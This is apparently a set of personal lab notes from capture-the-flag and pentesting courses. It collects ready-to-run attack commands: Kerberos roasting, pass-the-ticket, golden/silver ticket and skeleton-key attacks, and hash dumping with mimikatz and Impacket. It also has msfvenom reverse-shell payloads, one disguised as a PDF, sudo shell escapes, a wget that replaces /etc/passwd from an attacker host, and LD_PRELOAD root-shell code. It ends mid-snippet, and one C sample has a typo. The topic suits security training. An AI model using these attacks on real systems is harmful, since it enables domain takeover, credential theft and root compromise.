After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

GetNPUsers.py spookysec.local/ -usersfile after_kerbrute.txt -format john -output results.txt

smbclient -U "svc-admin" \\\\10.10.134.44\\backup

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes. Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

secretsdump.py spookysec.local/backup:backup2517860@10.10.248.76 -outputfile results_secretsdump.txt

evil-winrm -i 10.10.248.76 -u 'administrator' -H '0e0363213e37b94221497260b0bcb4fc'

--=-=-=--=-=-=
What is Kerberos?
Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.


Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.

Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.

Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

AS-REQ w/ Pre-Authentication In Detail - 
The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

Ticket Granting Ticket Contents -
In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Service Ticket Contents - 
To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

    Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
    User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

Kerberos Authentication Overview -

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access 

Kerberos Tickets Overview - 

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements -

    Kerbrute Enumeration - No domain access required 
    Pass the Ticket - Access as a user to the domain required
    Kerberoasting - Access as any user required
    AS-REP Roasting - Access as any user required
    Golden Ticket - Full domain compromise (domain admin) required 
    Silver Ticket - Service hash required 
    Skeleton Key - Full domain compromise (domain admin) required
---===--===-==

Enumeration w/Kerbrute
You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - 10.10.55.165  CONTROLLER.local    

Abusing Pre-Authentication Overview -

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.
1. kerbrute userenum -d spookysec.local --dc 10.10.246.78 userlist.txt

-=-=-=-=
Harvesting & Brute-Forcing tickets w/Rubeus

Rubeus.exe harvest /interval:30 This command tells Rubeus to harvest for TGTs every 30 seconds

Brute-Forcing / Password-Spraying w/ Rubeus -

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

echo 10.10.55.165 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
Rubeus.exe brute /password:Password1 /noticket - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

-=-=-=-=
Kerberoasting w/Rubeus & Impacket
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain

Method 1 - Rubeus
Rubeus.exe kerberoast This will dump the Kerberos hash of any kerberoastable users
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Method 2 - Impacket
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.55.165 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Kerberoasting Mitigation
Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

-=-=-=-==
AS-REP Roasting w/Rubeus 
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.

There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.


AS-REP Roasting Overview - 

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

Dumping KRBASREP5 Hashes w/ Rubeus -
  Rubeus.exe asreproast - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
Crack those Hashes w/ hashcat - 
  Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....

AS-REP Roasting Mitigations - 

    Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective

    Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
-=-=-=-=-=
Pass the ticket w/ mimikatz 
Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

Pass the Ticket Overview - 
Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

First, we utilize UACME to bypass UAC protection and get “Debug Privileges” and “High Integrity”. We can use “whoami /all” to check current privileges and the integrity level

mimikatz.exe
privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in

1.) kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.


Pass the Ticket Mitigation -

Let's talk blue team and how to mitigate these types of attacks. 

    Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
-=-=-=-=-=-=
Golden/Silver Ticket Attacks w/ mimikatz 

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

KRBTGT Overview 

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

Golden/Silver Ticket Attack Overview - 

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

Dump the krbtgt hash -
  privilege::debug - ensure this outputs [privilege '20' ok]
  lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.


Create a Golden/Silver Ticket - 

Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
  Ex: kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 

Use the Golden/Silver Ticket to access other machines -

misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.

Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

 -=-=-=-=-=-=
 Kerberos Backdoors w/ mimikatz 

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

privilege::debug
misc::skeleton 

Accessing the forest - 

The default credentials will be: "mimikatz"

example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques

-=-=-=-=-=-=-=
post-exploitation 

Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.

1.)Start Powershell - powershell -ep bypass -ep bypasses the execution policy of powershell allowing you to easily run scripts
2.) Start PowerView - . .\Downloads\PowerView.ps1
3.) Enumerate the domain users - Get-NetUser | select cn
4.) Enumerate the domain groups - Get-NetGroup -GroupName *admin*    
get-smbshare -name [share] | fl *
get-smbshareaccess -name "share"
get-netcomputer -fulldata | select operatingsystem

-=-=-=-
Enumeration w/ Bloodhound
Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.

Well be focusing on how to collect the .json files and how to import them into Bloodhound

BloodHound Installation -

1.) apt-get install bloodhound    

2.) neo4j console - default credentials -> neo4j:neo4j

Getting loot w/ SharpHound -

get-executionpolicy
1.) powershell -ep bypass same as with PowerView

2.) . .\Downloads\SharpHound.ps1    

3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
-=-=-=-==
Dumping hashes w/ mimikatz 

privilege::debug 
lsadump::lsa /patch 

-=-=-=-=-=
Enumeration w/Server Manager


Because servers are hardly ever logged on unless its for maintenance this gives you an easy way for enumeration only using the built in windows features such as the server manager. If you already have domain admin you have a lot of access to the server manager in order to change trusts, add or remove users, look at groups, this can be an entry point to find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network and continue your testing.

The only way to access the server manager is to rdp into the server and access the server over an rdp connection

We'll only be going over the basics such as looking at users, groups, and trusts however there are a lot of other mischief that you can get your hands on in terms of enumerating with the server manager

This can also be a way of easily identifying what kind of firewall the network is using if you have not already enumerated it.

-=-=-=-=-=-=-==============================
Intro to shells

One of the most prominent of these is Payloads all the Things. The PentestMonkey Reverse Shell Cheatsheet is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at /usr/share/webshells. The SecLists repo, though primarily used for wordlists, also contains some very useful code for obtaining shells.

Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener.

-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=
msfvenom
  
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.98 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe


Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.

Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.



* Another explanation
    + Singles
        > A Single payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large. Singles are self-contained payloads. They are the sole object sent and executed on the target system, getting us a result immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process
    + Stagers
        > Stager payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. Metasploit will use the best one and fall back to a less-preferred one when necessary.
        Windows NX vs. NO-NX Stagers
            Reliability issue for NX CPUs and DEP
            NX stagers are bigger (VirtualAlloc memory)
            Default is now NX + Win7 compatible

    + Stages
        > Stages are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others. Payload stages automatically use middle stagers:
            A single recv() fails with large payloads
            The Stager receives the middle stager
            The middle Stager then performs a full download
            Also better for RWX

Staged Payloads
    > A staged payload is, simply put, an exploitation process that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together. This will ultimately grant an attacker remote access to the target machine if all the stages work correctly.
    > The scope of this payload, as with any others, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with the Antivirus (AV) / Intrusion Prevention System (IPS) evasion as much as possible.
    > Stage0 of a staged payload represents the initial shellcode sent over the network to the target machine's vulnerable service, which has the sole purpose of initializing a connection back to the attacker machine. This is what is known as a reverse connection. As a Metasploit user, we will meet these under the common names reverse_tcp, reverse_https, and bind_tcp. For example, under the show payloads command, you can look for the payloads



[+] Builiding a simple stageless payload for a windows system
	m1l0js@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[+] Executing a Simple Stageless Payload On a Windows System

	> This is another situation where we need to be creative in getting this payload delivered to a target system. Without any encoding or encryption, the payload in this form would almost certainly be detected by Windows Defender AV.
	> If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.

#Payload Naming Conventions

  When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
  <OS>/<arch>/<payload>

  For example:
  linux/x86/shell_reverse_tcp
  This would generate a stageless reverse shell for an x86 Linux target.

  The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:
  windows/shell_reverse_tcp

  For a 64bit Windows target, the arch would be specified as normal (x64).

  Let's break the payload section down a little further.
  In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). 

  The staged equivalent to this payload would be:
    shell/reverse_tcp
  As staged payloads are denoted with another forward slash (/).

  This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
  windows/x64/meterpreter/reverse_tcp

  A Linux 32bit stageless Meterpreter payload would look like this:

  linux/x86/meterpreter_reverse_tcp

  Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:

  msfvenom --list payloads

  This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads.
-=-=-=-=-
Once we gain access to a shell

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at /home/<user>/.ssh are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
 or C:\xampp\FileZilla Server\FileZilla Server.xml
. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.


The syntax for this is as follows:

net user <username> <password> /add

net localgroup administrators <username> /add

-=-=-=-=
RDP 
  xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'

-=-=-=-=-=-=-=-=-=-=-=
Linux privelege escalation

1.enumeration 
2.kernel exploits 
3.sudo 
4.suid 
5.capabilities 
6.cron jobs 
7.PATH 
8.NFS 
9.SS
10.lxd

1.First things to check
 hostname
 uname -a 
 /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
 /etc/issue
 ps Command
  The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
  The output of the ps (Process Status) will show the following;
    PID: The process ID (unique to the process)
    TTY: Terminal type used by the user
    Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
    CMD: The command or executable running (will NOT display any command line parameter)

  The “ps” command provides a few useful options.

    ps -A: View all running processes
    ps axjf: View process tree (see the tree formation until ps axjf is run below)
    ps aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

  env

    The env command will show environmental variables.
    The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
    If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH

  sudo -l
    The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

  Id
    The id command will provide a general overview of the user’s privilege level and group memberships.
    It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.

  /etc/passwd
    Reading the /etc/passwd file can be an easy way to discover users on the system.

  history
    Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

  ifconfig
    The target system may be a pivoting point to another network. 

  ip route 
    To see wich network routes exist

  netstat
      netstat -a: shows all listening ports and established connections.
      netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
      netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
      netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol. 
      netstat -tp: list connections with the service name and PID information. This can also be used with the -l option to list listening ports
      netstat -i: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

  The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows;

      -a: Display all sockets
      -n: Do not resolve names
      -o: Display timers

  find Command

  Find files:

      find . -name flag1.txt: find the file named “flag1.txt” in the current directory
      find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
      find / -type d -name config: find the directory named config under “/”
      find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
      find / -perm a=x: find executable files
      find /home -user frank: find all files for user “frank” under “/home”
      find / -mtime 10: find files that were modified in the last 10 days
      find / -atime 10: find files that were accessed in the last 10 day
      find / -cmin -60: find files changed within the last hour (60 minutes)
      find / -amin -60: find files accesses within the last hour (60 minutes)
      find / -size 50M: find files with a 50 MB size. This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

  It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output 


  Folders and files that can be written to or executed from:

      find / -writable -type d 2>/dev/null : Find world-writeable folders
      find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
      find / -perm -o w -type d 2>/dev/null: Find world-writeable folders

  The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.


      find / -perm -o x -type d 2>/dev/null : Find world-executable folders

  Find development tools and supported languages:

      find / -name perl*
      find / -name python*
      find / -name gcc*

  Find specific file permissions:

  Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

      find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 


  cat /etc/shells #Check available shells

  1 –> Sticky Bit

  2 –> SGID

  4 –> SUID

  7 –> Todos los anteriores

  find / -perm -u=s -type f 2>/dev/null
  find / -perm /4000 -type f 2>/dev/null
  find / -user root -perm -4000 -exec ls -ldb {} \;
  find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.
##Automated enumaration tools 
LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
LinEnum: https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
Linux Priv Checker: https://github.com/linted/linuxprivchecker

Readable /etc/shadow
Writable /etc/shadow
  mkpasswd -m sha-512 newpasswordhere
Writable /etc/passwd
  openssl passwd newpasswordhere
sudo -l 
nano
  sudo nano
  ctrl+r 
  ctrl+x 
  reset; sh 1>&0 2>&0 

#another way
  openssl passwd -1 -salt loquesea pass
  We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.
  We will then add this password with a username to the /etc/passwd file.



vim
  sudo vim -c ':!/bin/bash'
  or 
  sudo vim 
  :set shell=/bin/bash 
  :shell
apache2
  sudo apache2 -f /etc/shadow
wget 
  On Attaker Side.

  First Copy Target’s /etc/passwd file to attacker machine.
  modify file and add a user in passwd file which is saved in the previous step to the attacker machine.
  append this line only =>  touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
  host that passwd file to using any web server.

  On Victim Side.
  sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd

  now switch user
awk
  sudo awk 'BEGIN {system("/bin/bash")}'
less
  sudo less /etc/profile #For example
ftp
  sudo ftp
  !/bin/bash
nmap 
  TF=$(mktemp)
  echo 'os.execute("/bin/sh")' > $TF
  sudo nmap --script=$TF

  sudo nmap --interactive 
  !/bin/bash
more
  sudo TERM= more /etc/profile 
  !/bin/sh
systemctl
  TF=$(mktemp).service
  echo '[Service]
  Type=oneshot
  ExecStart=/bin/sh -c "whoami"
  [Install]
  WantedBy=multi-user.target' > $TF
  /bin/systemctl link $TF
  /bin/systemctl enable --now $TF
  /bin/bash -p

-=-=-=-=-=-=-=-=-=-=-=-=-=
#Environment variables
gcc -fPIC -shared -nostartfiles -o /tmp/exploiting.so /home/user/tools/sudo/preload.c
  
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
  usetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

sudo LD_PRELOAD=/tmp/exploiting.so program-name-here
-=-=-=
Another example with LD_PRELOAD 

LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

    Check for LD_PRELOAD (with the env_keep option)
    Write a simple C code compiled as a share object (.so extension) file
    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

The function is named _init and that's important, otherwise your exploit code won't work. The reason is that the  _init function runs before any other user-defined code runs, to perform all the necessary initializations. So the name has to be the same, or else it won't work*

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

gcc -fPIC -shared -o shell.so shell.c -nostartfiles


We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

This will result in a shell spawn with root privileges.

-=-
#Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile). Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file. 


ldd /usr/sbin/apache2
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c 

#include <stdio.h>
